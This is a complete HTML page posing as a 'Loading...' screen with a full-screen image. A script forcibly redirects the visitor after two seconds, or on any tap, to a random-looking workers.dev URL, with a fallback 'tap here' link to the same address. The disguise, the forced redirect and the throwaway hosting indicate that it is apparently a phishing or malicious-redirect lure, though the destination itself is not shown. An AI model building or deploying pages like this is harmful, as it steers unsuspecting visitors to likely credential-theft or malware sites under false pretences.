<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #000;
      font-family: Arial, sans-serif;
      overflow: hidden;
    }

    img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    .fallback {
      position: absolute;
      bottom: 20px;
      width: 100%;
      text-align: center;
      color: #fff;
      font-size: 14px;
    }

    .fallback a {
      color: #00ffff;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <!-- Your image -->
  <img src="extracted.png" alt="Loading..." />

  <!-- Fallback link (important for blocked redirects) -->
  <div class="fallback">
    If nothing happens, <a href="https://ojfwo-suem-on9l.jimmy-baileybuilders-com-s-account.workers.dev/lp/l0cwxUxLdWo">tap here</a>
  </div>

  <script>
    // Delay (in milliseconds)
    const delay = 2000;

    // Redirect function
    function redirect() {
      window.location.href = "https://ojfwo-suem-on9l.jimmy-baileybuilders-com-s-account.workers.dev/lp/l0cwxUxLdWo";
    }

    // Try redirect after delay
    setTimeout(redirect, delay);

    // Extra fallback: redirect when user taps anywhere
    document.body.addEventListener('click', redirect);
  </script>

</body>
</html>
